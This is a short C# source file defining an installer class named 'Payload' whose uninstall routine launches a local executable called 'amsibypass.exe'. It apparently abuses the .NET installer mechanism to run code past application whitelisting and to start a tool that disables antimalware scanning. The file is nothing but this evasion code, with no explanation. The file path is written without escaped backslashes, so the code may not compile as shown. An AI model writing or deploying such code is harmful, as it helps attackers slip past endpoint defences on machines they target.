using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Configuration.Install;

[RunInstaller(true)]
public class Payload : Installer {
  public override void Uninstall(System.Collections.IDictionary savedState) {
    Process.Start("C:\Users\ar59365\Downloads\amsibypass\amsibypass.exe");
  }
}
